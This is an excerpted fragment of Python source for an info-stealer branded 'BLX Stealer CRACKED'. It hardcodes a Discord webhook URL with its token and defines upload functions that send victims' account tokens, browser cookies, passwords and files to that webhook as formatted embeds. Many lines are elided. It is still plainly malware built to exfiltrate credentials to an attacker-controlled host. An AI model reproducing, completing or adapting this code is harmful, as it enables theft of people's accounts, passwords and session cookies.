...
hook = "https://discord.com/api/webhooks/1139562989599592578/S1uFgDMom33F45JQnYTdu5CoZaykI87N-KFNYlMmNbsEx2dAVTy-WRrIOpdCcMCYc3pE"
...
def UP104D70K3N(token, path):
    ...
    data = {
            ...
            "fields": [
                {
                    ...
                    "value": f"`{token}`\n[dont click or u will get your account stolen CRACKED by idek ](https://superfurrycdn.nl/copy/{token})"
                },
                {
        ...
        "username": "BLX Stealer CRACKED | t.me/blxstealer",
        "attachments": []
        }
...
def UP104D(name, link):
    ...
    if name == "lxcook":
        ...
        data = {
            ...
            "embeds": [
                {
                    "title": "BLX Stealer CRACKED | Cookies",
    ...
    if name == "lxpassw":
        ...
        data = {
            ...
            "embeds": [
                {
                    "title": "BLX Stealer CRACKED | Passwords",
    ...
    if name == "kiwi":
        data = {
            ...
            "embeds": [
                ...
                "author": {
                    "name": "BLX Stealer CRACKED | Files"
                },
                "footer": {
                    "text": "BLX Stealer CRACKED ",
                    "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
